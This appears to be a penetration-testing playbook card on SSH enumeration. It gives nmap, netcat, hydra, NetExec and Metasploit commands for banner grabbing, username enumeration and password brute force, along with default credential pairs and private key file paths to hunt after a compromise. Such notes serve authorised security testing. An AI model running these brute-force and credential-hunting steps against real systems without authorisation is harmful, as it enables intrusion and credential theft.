---
id: ssh-enum
title: SSH Enumeration
stage: enumeration
tags: [windows, linux, ssh]
tools:
  - nmap -p22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $TARGET
  - nc -nv $TARGET 22
  - hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
  - nxc ssh $CIDR -u user -p password --continue-on-success
leads_to: [ssh-access, password-spray, public-exploit]
summary: Banner grab, enumerate auth methods, and brute-force credentials on SSH.
---

## Banner Grab & Version

Old OpenSSH versions (<7.x) may have exploitable CVEs. Always check.

```bash
nc -nv $TARGET 22
nmap -p22 --script banner $TARGET
```

Fingerprint the host key and cipher suites:
```bash
nmap -p22 --script ssh-hostkey,ssh2-enum-algos $TARGET
```

## Auth Methods

```bash
nmap -p22 --script ssh-auth-methods --script-args ssh.user=root $TARGET
# Look for: password, publickey, keyboard-interactive
```

If `publickey` only — password brute force won't work. Hunt for key files elsewhere in the engagement.

## Brute Force

```bash
# Hydra
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://$TARGET -t 4 -V

# NetExec
nxc ssh $TARGET -u users.txt -p passwords.txt --continue-on-success
nxc ssh $TARGET -u admin -p password
```

## Username Enumeration (old OpenSSH)

OpenSSH < 7.7 leaks valid usernames via timing differences in error responses:

```bash
# Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS $TARGET
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
run
```

## Default Credentials

Always try before brute forcing:
- `root:root`, `root:toor`, `admin:admin`, `admin:password`
- `pi:raspberry` (Raspberry Pi)
- `vagrant:vagrant`

## Notes

- Default port 22; also check 2222, 22022, 2200
- SSH key files to hunt in post-compromise: `~/.ssh/id_rsa`, `/etc/ssh/ssh_host_rsa_key`, `~/.ssh/authorized_keys`
- Weak cipher suites (3DES, arcfour) indicate an old/unpatched server → check for known CVEs
- `Permission denied (publickey)` = password auth disabled; need a key
